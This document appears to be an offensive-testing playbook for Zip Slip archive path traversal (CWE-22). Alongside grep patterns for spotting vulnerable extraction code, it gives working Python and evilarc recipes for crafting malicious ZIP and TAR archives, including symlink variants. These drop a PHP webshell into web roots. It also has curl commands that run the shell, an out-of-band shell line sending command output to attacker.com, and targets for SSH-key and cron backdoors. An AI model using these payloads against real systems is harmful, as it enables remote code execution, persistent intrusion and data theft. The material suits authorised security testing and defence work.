# VULN MODULE — Zip Slip / Archive Path Traversal
# Asset: webapp
# CWE-22 | Report prefix: WEB-ZIPSLIP

## THREAT MODEL

Zip Slip is a path traversal vulnerability triggered during archive extraction.
Malicious archives contain entries with `../` in their file paths, causing the
extraction routine to write files outside the intended destination directory.
Impact: arbitrary file write → webshell placement → RCE.

Affected formats: ZIP, TAR, TAR.GZ, TAR.BZ2, TGZ, JAR, WAR, 7Z, CPIO, APK, IPA

Attack surface:
- File upload endpoints accepting archives
- Plugin/theme/extension upload (CMS, IDEs, CI systems)
- Backup import functionality
- Dependency/package installation endpoints
- Document conversion (extract-and-process)

## WHITEBOX PATTERNS

```bash
# Python — zipfile, tarfile (no path sanitization)
grep -rn "zipfile\.\|tarfile\.\|ZipFile\|TarFile" --include="*.py" -A15 | \
  grep -i "extractall\|extract\|extractfile"
# Look for: extractall(path) without member path sanitization
# Safe pattern: check entry.name.startswith('..')

# Java — ZipEntry, ZipInputStream
grep -rn "ZipEntry\|ZipInputStream\|ZipFile\b" --include="*.java" -A10 | \
  grep -i "getname\|extract\|outputstream"
# Missing check: entry.getName().contains("..") → vulnerable

# Node.js — adm-zip, unzipper, node-tar
grep -rn "adm-zip\|unzipper\|node-tar\|extract-zip\|yauzl" \
  --include="*.js" --include="*.ts" -A10
# Look for: .extractAll() without path validation

# PHP — ZipArchive
grep -rn "ZipArchive\|extractTo\|PharData" --include="*.php" -A10

# Ruby
grep -rn "Zip::File\|rubyzip\|tar\b" --include="*.rb" -A10
```

## CREATING MALICIOUS ARCHIVES

### Using evilarc (Python tool)

```bash
# Install evilarc:
git clone https://github.com/ptoomey3/evilarc
python evilarc.py

# Create malicious ZIP with path traversal:
python evilarc.py shell.php \
  -o unix \
  -d 5 \
  -p "var/www/html/" \
  -f evil.zip

# Creates: evil.zip with entry: ../../../../var/www/html/shell.php
# -d 5 = 5 levels of ../
# -p = target path suffix after the traversal

# For Windows target:
python evilarc.py shell.aspx \
  -o win \
  -d 3 \
  -p "inetpub/wwwroot/" \
  -f evil_win.zip
```

### Manual ZIP creation (Python)

```python
import zipfile

# Write webshell via path traversal
with zipfile.ZipFile("evil.zip", "w") as zf:
    zf.write("shell.php",
             arcname="../../var/www/html/uploads/shell.php")
    # Multiple traversal levels:
    zf.write("shell.php",
             arcname="../../../var/www/html/shell.php")

# TAR with path traversal:
import tarfile, io

payload = b"<?php system($_GET['cmd']); ?>"
tar = tarfile.open("evil.tar.gz", "w:gz")
info = tarfile.TarInfo(name="../../var/www/html/shell.php")
info.size = len(payload)
tar.addfile(info, io.BytesIO(payload))
tar.close()
```

### Symlink approach (alternative — 2-step)

```python
import tarfile, io, os

# Step 1: create symlink entry pointing outside extraction dir
info1 = tarfile.TarInfo(name="link")
info1.type = tarfile.SYMTYPE
info1.linkname = "/var/www/html"  # points to web root

# Step 2: write file "through" the symlink
info2 = tarfile.TarInfo(name="link/shell.php")

payload = b"<?php system($_GET['cmd']); ?>"
info2.size = len(payload)

tar = tarfile.open("evil_symlink.tar", "w")
tar.addfile(info1)
tar.addfile(info2, io.BytesIO(payload))
tar.close()
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Identify archive upload endpoints

```bash
# Look for:
# - Plugin/theme upload
# - Import/restore functionality
# - "Upload ZIP" buttons
# - API endpoints accepting multipart with .zip/.tar extension
```

### Step 2 — Create payload

```bash
# Simple PHP webshell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Create malicious archive:
python evilarc.py shell.php -d 3 -p "var/www/html/" -f evil.zip

# Or for blind (no direct web access to web root):
python evilarc.py shell.php -d 5 -p "" -f evil_blind.zip
# Try multiple depths: 1, 2, 3, 5, 8
```

### Step 3 — Upload and verify

```bash
# Upload evil.zip via the endpoint
# Then verify write succeeded:
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/shell.php?cmd=id"
curl "https://target.com/static/shell.php?cmd=id"

# If blind (no web access), use OOB:
echo '<?php file_get_contents("http://attacker.com/?h=".`id`); ?>' > oob_shell.php
```

### Step 4 — Alternative write targets (beyond web root)

```
../../.ssh/authorized_keys          → SSH key injection
../../etc/cron.d/backdoor           → cron job execution
../../etc/profile.d/backdoor.sh     → shell startup execution
../../tmp/shell.php                 → combine with LFI
```

## AFFECTED LIBRARIES (Known vulnerable versions)

| Library | Language | Status |
|---|---|---|
| Python zipfile | Python | Vulnerable if no path check |
| Python tarfile | Python | Vulnerable (3.12 added filter= param) |
| Truezip | Java | Fixed in newer versions |
| zip-slip-vulnerable (demo) | Java | Always vulnerable |
| rubyzip < 1.3.0 | Ruby | Fixed in 1.3.0 |
| adm-zip < 0.5.0 | Node.js | Fixed in 0.5.0 |
| SharpZipLib | .NET | Fixed in 1.2.0 |
| Apache Commons Compress | Java | Fixed in 1.18 |

## TOOLS

```bash
# evilarc — create malicious ZIP/TAR with path traversal
git clone https://github.com/ptoomey3/evilarc
python evilarc.py <file> -d <depth> -p <path> -f <output.zip>

# Burp Suite — upload malicious archive, check response for extraction errors
# Any path-related error (FileNotFoundException, PermissionError with target path)
# confirms traversal was attempted

# zipinfo — inspect archive entries:
zipinfo evil.zip
tar -tvf evil.tar.gz
```
